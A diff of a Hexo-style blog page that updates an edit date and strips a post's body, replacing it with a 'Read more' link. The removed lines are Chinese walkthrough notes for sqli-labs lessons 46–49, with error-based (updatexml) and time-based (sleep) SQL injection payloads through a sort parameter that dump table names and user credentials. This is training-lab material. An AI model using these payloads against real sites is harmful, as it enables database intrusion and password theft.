           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-18 20:25:28" itemprop="dateModified" datetime="2022-02-18T20:25:28+08:00">2022-02-18</time>
+        <time title="Modified: 2025-07-26 10:46:42" itemprop="dateModified" datetime="2025-07-26T10:46:42+08:00">2025-07-26</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1117,43 +1016,14 @@
 <p>select * from users order by 1 desc;</p>
 <p>select * from users order by 1 asc;</p>
 <p>lines terminated by XXX     每一行以XXX为结尾</p>
-<h1 id="lesson46"><a href="#lesson46" class="headerlink" title="lesson46"></a>lesson46</h1><p>提示输入sort</p>
-<p>?sort=1</p>
-<p><img src="https://s2.loli.net/2022/02/16/sn9aZ3S5cfvIrH1.png" alt="QQ截图20220216163248.png"></p>
-<p>?sort=2</p>
-<p><img src="https://s2.loli.net/2022/02/16/qwOZI6SJFV1dBiX.png" alt="QQ截图20220216163356.png"></p>
-<p>发现sort 后面因该跟的是列数，1列就按1到14排序，2列就是a到z排序</p>
-<p>效果跟 order by 一样</p>
-<p>首先是用联合查询尝试，不行</p>
-<p>然后我们尝试报错注入</p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(database())),1)–+</p>
-<p><img src="https://s2.loli.net/2022/02/16/OuF34ZWhzHXPQUE.png" alt="QQ截图20220216165840.png"></p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),1)–+</p>
-<p><img src="https://s2.loli.net/2022/02/16/UCebynZDLrsxGMO.png" alt="QQ截图20220216170022.png"></p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=0x7573657273)),1)–+</p>
-<p><img src="https://s2.loli.net/2022/02/16/dCjRKtSGMlIcrhi.png" alt="QQ截图20220216170202.png"></p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(concat(0x7e,username,password))from security.users)),1)–+</p>
-<p><img src="https://s2.loli.net/2022/02/16/jypbm2rFS5c8aU3.png" alt="QQ截图20220216170356.png"></p>
-<p>方法二用时间（延迟）注入</p>
-<p>?sort=1 and if(left(database(),1)=’s’,sleep(3),1)–+</p>
-<p><img src="https://s2.loli.net/2022/02/16/MWC9BIljGZgcXpL.png" alt="QQ截图20220216171635.png"></p>
-<h1 id="lesson47"><a href="#lesson47" class="headerlink" title="lesson47"></a>lesson47</h1><p>lesson47与46做法一样</p>
-<p>就是数据包裹不同，lesson47是用单引号进行包裹的</p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(database())),1)–+</p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),1)–+</p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=0x7573657273)),1)–+</p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(concat(0x7e,username,password))from security.users)),1)–+</p>
-<h1 id="lesson48"><a href="#lesson48" class="headerlink" title="lesson48"></a>lesson48</h1><p>没有报错的回显所以不能用报错注入</p>
-<p>只能用时间(延迟)注入</p>
-<p>?sort=1 and if(left(database(),8)=’security’,sleep(2),1)–+</p>
-<p><img src="https://s2.loli.net/2022/02/16/g7LEVFOJdcShx28.png" alt="QQ截图20220216172801.png"></p>
-<h1 id="lesson49"><a href="#lesson49" class="headerlink" title="lesson49"></a>lesson49</h1><p>也没有报错回显，用时间注入</p>
-<p>?sort=1 and if(left(database(),8)=’security’,sleep(2),1)–+</p>
-<p>?sort=1 and if(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1)=’e’,1,sleep(2))–+</p>
-<p>?sort=1 and if(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1)=’e’,1,sleep(2))–+</p>
-<p>?sort=1 and if(substr((select username from security.users limit 0,1),1,1)=’e’,1,sleep(2))–+</p>
-<p>?sort=1 and if(substr((select password from security.users limit 0,1),1,1)=’e’,1,sleep(2))–+</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/02/04/lesson46/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
